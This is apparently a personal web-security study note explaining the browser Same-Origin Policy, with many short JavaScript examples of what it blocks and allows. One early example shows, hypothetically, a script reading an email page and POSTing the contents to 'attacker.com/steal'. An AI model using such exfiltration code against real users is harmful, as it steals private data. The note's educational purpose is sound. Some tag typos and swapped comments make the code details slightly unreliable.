---
created: 2026-05-11
tags:
  - web_knowledge_base
  - web_hacking
  - client-side
---

## The SOP

> The **Same-Origin Policy (SOP)** is a browser-enforced isolation mechanism that restricts scripts loaded from one origin from reading or interacting with resources (DOM, data, or state) belonging to a different origin (unless explicitly permitted by the target origin).

The Same-Origin Policy is one of the foundational browser security controls. Nearly every modern client-side security model ultimately depends on SOP in some form.

- Browsers routinely interact with multiple security contexts simultaneously (e.g., banking sessions, corporate portals, email providers, cloud dashboards, internal applications, etc.).
- Without SOP, any page could execute JavaScript that reads data across other currently open authenticated sessions. 

>[!example]+
> Without SOP, this would be possible:
> ```JS
> fetch("https://email.example.com")
>   .then(r => r.text())
>   .then(data => {
>     fetch("https://attacker.com/steal", {
>       method: "POST",
>       body: data
>     });
>   });
> ```

- SOP restricts **reading** form other origins, but generally permits **writing** (sending requests).
## Origin and site

### Origin

>An **origin** is a combination of a **URL scheme** (`https://`, `http://`), **hostname**, and **port number** (`80`, `443`). 

- Two resources are considered **same-origin** if and only if all three components match exactly: **same scheme, hostname, and port number**.


![[origin_and_site.svg|587]]


> [!example]+
> |             Origin A             |             Origin B             | Same-origin? |       Reason       |
> | :------------------------------: | :------------------------------: | :----------: | :----------------: |
> |      `https://example.com`       |      `https://example.com`       |     Yes      |    Exact match     |
> |      `https://example.com`       |       `http://example.com`       |      No      |  Scheme mismatch   |
> |    `https://app.example.com`     |    `https://api.example.com`     |      No      |   Host mismatch    |
> |    `https://example.com:8080`    |      `https://example.com`       |      No      |   Port mismatch    |
> | `https://example.com/index.html` | `https://example.com/login.html` |     Yes      | Path is irrelevant |

>[!note] URL path, query string, and fragment are irrelevant. Only scheme, hostname, and port number matter.

### Site

>A **site** is a combination of the URI scheme and the **effective Top-Level Domain +1 (eTLD+1)** — the registered domain including its public suffix.

- A site is a _looser_ grouping than an origin. Subdomains and ports are not part of a site.

>[!example]+
>- In `http://examle.com`, eTLD+1 is `example.com`. 
>- `https://app.example.com`, `https://api.example.com`, `https://www.example.com` are the **same site** (scheme and eTLD+1 are the same), but **different origins** (different hostnames).

- **SOP** uses the **origin** model — subdomains are isolated from each other.
- **`SameSite` cookies** use the **site** model — cookies may be sent across subdomains even when SOP blocks script access.
## SOP restrictions 

> SOP is enforced by the browser, not by the server.

- The browser tracks the origin of every document, script, and resource.
- When JavaScript attempts to access data belonging to another origin, the browser compares the scheme, hostname, and port. If they differ, the browser blocks the operation.
- This enforcement applies to:
	- DOM access
	- JavaScript APIs
	- storage APIs
	- Fetch/XHR response access
	- iframe interaction
### What SOP restricts

>The SOP primarily restricts **cross-origin read access**.

- A script may *send* requests to another origin, but it is generally prevented from *reading* the response or accessing the target origin’s internal state.
- This prevents impact of certain client-side attacks.
	- For example, if an attacker injects JavaScript into a vulnerable application ([[🛠️ XSS]]), the SOP prevents that script from directly reading data from unrelated origins.
	- However, the SOP does **not** prevent XSS itself. It only limits what injected scripts can access outside the compromised origin.

---

**The SOP blocks access to:**

- **Cross-origin DOM access**
	- Scripts cannot inspect or manipulate the DOM of a document loaded from another origin. 
	- This includes documents embedded via `<iframe>` elements.

>[!example]-
>A script from `https://attacker.com` cannot read or manipulate the contents of an `<iframe>` loaded from `https://example.com`.
> 
> 
> - `https://attacker.com` embeds:
> 
> ```html
> <iframe src="https://example.com" id="targetFrame"></frame>
> ```
> 
> ```js
> const iframe = document.getElementById("targetFrame");
> 
> // attempting to read contents of a document loaded via iframe:
> console.log(
> 	iframe.contentWindow.document.body.innerText
> );
> ```
> 
> - The browser blocks the operation and throws:
> 
> ```bash
> SecurityError:
> Blocked a frame with origin
> "https://attacker.example"
> from accessing a cross-origin frame.
> ```
> 
> - This prevents the attacker from reading sensitive information from another origin.

- **Cross-origin fetch / XHR responses**
	- Browsers allow cross-origin HTTP requests to be *sent*; however, the SOP prevents JavaScript from *reading the response* (unless the target server explicitly allows it through CORS).
	- **Sending requests** is often allowed, but **reading responses** is restricted.

>[!example]-
> - A script at `https://attacker.com` executes:
> 
> ```js
> fetch("https://api.example.com/profile")
>   .then(r => r.json())
>   .then(data => {
>     console.log(data);
>   });
> ```
> 
> - Sending the request cross-origin is allowed. 
> - The browser may still send the response back, together with the user's authentication cookies. However, the SOP blocks JavaScript from accessing the response body.

- **Cross-origin JavaScript objects and variables**
	- Scripts cannot access variables, functions, or objects created by documents from another origin.
	- Each origin operates inside its own isolated JavaScript execution context.


>[!example]-
> - Suppose a script at `https://example.com` stores a session token globally:
> 
> ```js
> window.sessionToken =  
> "eyJhbGciOi...";
> ```
> 
> - `https://attacker.com` embeds:
> 
> ```html
> <iframe src="https://example.com" id="targetFrame"></frame>
> ```
> 
> - Then attempts to read the `sessionToken` JavaScript object:
> 
> ```js
> const token =
>   iframe.contentWindow.sessionToken;
> ```
> 
> - The browser blocks access because the `<iframe>` belongs to a different origin.


- **Cross-origin storage access**
	- Browser storage is isolated per origin. 
	- A script cannot read or modify `localStorage`, `sessionStorage`, `IndexedDB`, or cache storage belonging to another origin.

>[!example]-
> - Suppose a single-page application (SPA) stores a JWT in `localStorage`:
> 
> ```js
> localStorage.setItem(  
> 	"token",  
> 	"jwt-token-value"  
> );
> ```
> 
> - A script hosted on `https://attacker.com` attempts to read it:
> 
> ```js
> localStorage.getItem("token");
> ```
> 
> - The attacker only accesses its _own_ origin’s storage. The browser completely isolates the storage belonging to `https://example.com`.

- **Cross-origin cookies**
	- JavaScript cannot directly read cookies belonging to another origin.
	- Even when browsers automatically attach cookies to outgoing requests, unrelated origins cannot access them through `document.cookie`.


>[!example]+
> - A user is authenticated to `https://example.com`. The site stores a session cookie: `sessionid=abc123`.
> - A script hosted on `https://attacker.com` attempts to read the cookie:
> 
> ```js
> console.log(document.cookie);
> ```
> 
> - But it only sees cookies belonging to `https://attacker.com`. Cookies belonging to `https://example.com` remain inaccessible.

- **Reading properties of `window` or `iframe` objects cross-origin**
	- Browsers expose only a very limited subset of cross-origin window properties.
	- Access to sensitive objects such as `iframe.contentWindow.document`, `window.frames[0].document`, `iframe.contentDocument` is blocked because these objects expose another origin's DOM and execution context.

>[!example]-
> - `https://attacker.com` embeds:
> 
> ```html
> <iframe src="https://example.com" id="targetFrame"></frame>
> ```
> 
> - Then attempts to read:
> 
> ```js
> console.log(
> 	frames[0].document.title
> );
> ```
> 
> - The browser blocks access because the embedded page belongs to a different origin.


- **Reading CSS stylesheets or computed styles cross-origin**
	- Browsers allow cross-origin stylesheets to be loaded and applied.
	- However, JavaScript is generally prevented from reading their CSS rules or computed styles.
	- This prevents websites from extracting potentially sensitive UI state or probing protected resources.

>[!example]-
>- `https://attacker.com` loads:
> 
> ```html
> <link rel="stylesheet" href="https://example.com/static/css/admin.css">
> ```
> 
> - Then attempts to read:
> 
> ```js
> const sheet =
>   document.styleSheets[0];
> 
> console.log(sheet.cssRules);
> ```
> 
> - The browser prevents access and throws a security error because the stylesheet is loaded from another origin.

- **Cross-origin canvas pixel data**
	- If an image or video from another origin is drawn onto a `<canvas>`, the canvas becomes **tainted**.
	- Once tainted, JavaScript cannot extract raw pixel data (unless the resource is explicitly shared using CORS).
	- This prevents attackers from using canvas APIs to extract information from protected resources.

>[!example]-
> - `https://attacker.com` loads a QR code image from another origin:
> 
> ```js
> const img = new Image();
> img.src =
>   "https://example.com/payments/qr-code.png";
> ```
> 
> - Then draws the image onto a canvas:
> 
> ```js
> ctx.drawImage(img, 0, 0);
> ```
> 
> - And attempts to read raw data:
> 
> ```js
> canvas.toDataURL();
> ```
> 
> - The browser blocks the operation because the image originated from another origin.
> - Without this protection, attackers could extract sensitive visual information from cross-origin resources.

### What SOP allows

>SOP does not completely block cross-origin interaction. It primarily restricts access to sensitive data and browser state.

- Many cross-origin operations remain allowed because they do not directly expose sensitive information.

>[!note] The SOP generally allows **cross-origin write operations**.

---

**The SOP generally allows:**

- **Sending cross-origin requests**
	- Browsers generally allow cross-origin requests to be initiated, such as:
		- form submission
		- link navigation
		- redirects
		- image requests
		-  stylesheet loading
		- script loading
	- What the SOP restricts is the ability for JavaScript to inspect the response afterward.

>[!example]-
> - A website submits data to an external payment provider:
> 
> ```html
> <form
>   action="https://example.com/checkout"
>   method="POST">
> 
>   <input
>     name="amount"
>     value="100">
> 
>   <button>
>     Check out
>   </button>
> </form>
> ```
> 
> - The browser allows the request to be sent.
> - However, the originating page cannot inspect the returned payment page with JavaScript (unless explicitly permitted via CORS).


- **Embedding cross-origin resources**
	- Browsers allow resources from other origins to be embedded into a page.
	- This includes images, videos, stylesheets, JavaScript files, and `iframes`.
	- However, embedding a resource does **not** grant unrestricted access to its contents.

>[!example]-
> - A website includes a JavaScript library hosted on a CDN:
> 
> ```html
> <script
>   src="https://cdn.example.com/lib.js">
> </script>
> ```
> 
> - Browsers allow the script to be downloaded and executed — but not inspected by JavaScript of the initiating origin.
> - This behavior is necessary for web applications that depend on external libraries, CDNs, payment providers, analytics services, and embedded media.

- **Navigation and redirects**
	- Scripts may navigate the browser to another origin.
	- They may also open new tabs or windows pointing to external websites.
	- This is allowed because navigation itself does not expose te target's page internal state.

>[!example]-
> - An application redirects users to an SSO (Single Sign-On) provider:
> 
> ```js
> window.location =
>   "https://sso.example.com";
>   
> // or
> window.open("https://sso.example.com");
> ```
> 
> - The browser allows the navigation because the current page is not attempting to inspect the content of the target location.

- **Limited cross-origin window access**
	- Browsers expose a small set of safe cross-origin properties and methods.
	- Examples include:
		- `window.closed`
		- `window.length`
		- `window.focus()`
		- `window.blur()`
		- `window.close()`
		- `window.postMessage()`
	- These operations are permitted because they do not expose sensitive application data.

>[!example]-
> A payment popup hosted on `https://payments.example.com` sends a payment completion message back to `https://shop.example.com`:
> 
> ```js
> // https://shop.example.com
> paymentWindow.postMessage(  
> 	"payment-complete",  
> 	"https://payments.example.com"  
> );
> ```
> 
> ```js
> // https://payments.example.com
> window.addEventListener(
>   "message",
>   event => {
>     if (
>       event.origin ===
>       "https://shop.example.com"
>     ) {
>       console.log(event.data);
>     }
>   }
> );
> ```
> 
> - `window.postMessage()` provides a controlled mechanism for cross-origin communication without bypassing the SOP protection.
## References and further reading

- [`Same-origin policy — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy)
- [`Same-origin policy (SOP) — PortSwigger Web Security Academy`](https://portswigger.net/web-security/cors/same-origin-policy)

